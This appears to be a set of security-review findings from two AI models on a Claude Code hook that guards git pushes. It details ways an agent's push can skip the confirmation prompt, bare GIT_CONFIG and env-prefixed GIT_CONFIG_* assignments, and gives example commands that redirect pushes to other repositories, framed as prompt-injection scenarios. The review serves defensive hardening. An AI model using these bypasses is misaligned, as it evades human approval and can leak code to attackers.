=== FINDINGS FROM deepseek_deepseek-v4-pro ===
- .claude/hooks/pr_merge_status_guard.py:362-363
  PROBLEM: The inline environment assignment check at line 362 uses `name.startswith("GIT_CONFIG_")` which requires a trailing underscore and at least one more character. Git's canonical `GIT_CONFIG` environment variable (without underscore suffix, singular, sets the config file path) does not match this prefix. Setting `GIT_CONFIG=/tmp/malicious.conf git push origin HEAD:branch` leaves `config_override=False` and the guard authorizes the push using the checkout's origin PR history while Git redirects to the configured destination.
  WHY: A prompt-injected Bash tool call that sets `GIT_CONFIG` can redirect a push to an attacker's repository without triggering a confirmation prompt, because `_evaluate_bash` sees `config_override=False` and queries origin's PR history with the overridden destination.
  severity=MAJOR, confidence=[5]
- workflow-templates/.claude/hooks/pr_merge_status_guard.py:362-363
  PROBLEM: Same `name.startswith("GIT_CONFIG_")` gap exists in the consumer-repo template copy. Consumer repositories receive this hook and are equally vulnerable to `GIT_CONFIG` env var bypass on push commands.
  WHY: Consumer repositories push without confirmation when `GIT_CONFIG` redirects the destination, same mechanism as the root copy.
  severity=MAJOR, confidence=[5]
- .claude/hooks/pr_merge_status_guard.py:349-351 and 367-368 in `_guarded_git_invocations`, and 677-678 in `git_subcommands`
  PROBLEM: Both command-recognition entry points require `git` as the first real token after assignments. `env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url ... git push origin HEAD:branch` is not recognized.
  WHY: `env` with `GIT_CONFIG_*` assignments can redirect a push destination through a single Bash command that neither `git_subcommands` nor `_guarded_git_invocations` detects as a git push. The guard returns silently without blocking or prompting.
  severity=MAJOR, confidence=[5]

=== FINDINGS FROM minimax_minimax-m3 ===
- .claude/hooks/pr_merge_status_guard.py
  Line or code reference: line 362 in the assignment-skipping loop (the `if name.startswith("GIT_CONFIG_"):` check) and the matching twin in workflow-templates/.claude/hooks/pr_merge_status_guard.py
  PROBLEM: The LAST RUN DIFF's prefix check `name.startswith("GIT_CONFIG_")` requires the trailing underscore, so a bare `GIT_CONFIG` (Git's documented config-file override env var, separate from `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_SYSTEM`) is not flagged as a config override.
  WHY: `GIT_CONFIG=/path/to/evil.gitconfig git push ...` (or any future Git release that adds a shorter `GIT_CONFIG*` sibling) is silently accepted as a normal push: `config_override` stays False, the unverified-destination short-circuit at lines 1322-1326 does not fire, and `_push_targets` proceeds against the checkout's origin PR history. A malicious prompt can then redirect the push to a foreign repository while the guard reports a normal authenticated push.
  severity=MAJOR, confidence=[4]
- .claude/hooks/pr_merge_status_guard.py
  Line or code reference: `_guarded_git_invocations` around the env-assignment-skipping loop (lines 350-366 after the LAST RUN DIFF) and the matching `git_subcommands` function (lines 665-674).
  PROBLEM: Neither function recognizes a `git` command prefixed by the standard `env` wrapper.
  WHY: `env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://github.com/other/repo git push origin HEAD:feature/x` is the canonical hostile payload the LAST RUN DIFF tries to cover with `GIT_CONFIG_*` assignments — wrapped in `env` it skips past both regexes, neither function returns the push, `_evaluate_bash` does not query origin's PR history, and the redirect to `other/repo` is authorized silently. The same bypass is reachable via `env GIT_CONFIG_GLOBAL=/tmp/other-config git push ...` once the bare-prefix check above is closed.
  severity=MAJOR, confidence=[5]
- README.md, agents.md, changelog.d/6187-isolated-codex-agents.md
  Line or code reference: README.md:1232 ("The same confirmation applies to inline `GIT_CONFIG_*` assignments before `git push`"), agents.md:618-624 (the bullet listing "Pushes with `git -c`, `--config-env`, or inline `GIT_CONFIG_*` assignments ask too"), and the matching paragraph in the changelog fragment at the "For contributors" line.
  PROBLEM: The LAST RUN DIFF extended the documentation to claim coverage of "inline `GIT_CONFIG_*` assignments" and "per-command Git configuration (`git -c`, `--config-env`, inline `GIT_CONFIG_*` assignments)" without noting that the underlying check is a strict prefix match and that the `env` wrapper bypasses the guard.
  WHY: An operator or reviewer reading the updated documentation has no signal that the `env` prefix or a bare `GIT_CONFIG` env var remain unauthenticated. The PR description likewise restates the same coverage. The fix is one sentence per surface ("`env`-prefixed pushes are not yet covered; see code X") or, better, the actual code change that closes the gap, after which the claim becomes accurate.
  severity=MAJOR, confidence=[4]

  PROBLEM: The guard misses Git pushes wrapped by `env`. Its configuration-override check runs only after the command has been recognized as a direct `git` invocation.

Git applies the supplied environment configuration, so the push can be redirected without the confirmation prompt.

- .claude/hooks/pr_merge_status_guard.py
  Line or code reference: 362
  PROBLEM: The check `name.startswith("GIT_CONFIG_")` does not match the canonical `GIT_CONFIG` environment variable (without underscore suffix). Git accepts `GIT_CONFIG=/path/to/file` to load configuration from an arbitrary file, which can redirect push destinations.
  WHY: When a user runs `GIT_CONFIG=/custom/config git push origin HEAD:feature`, the guard does not set `config_override = True` because "GIT_CONFIG" does not start with "GIT_CONFIG_". The push is authorized based on the checkout's origin PR history, but Git loads the custom configuration and pushes to a redirected destination without triggering the confirmation prompt. This bypasses the merged-PR guard's security check.
  severity=MAJOR, confidence=[5]
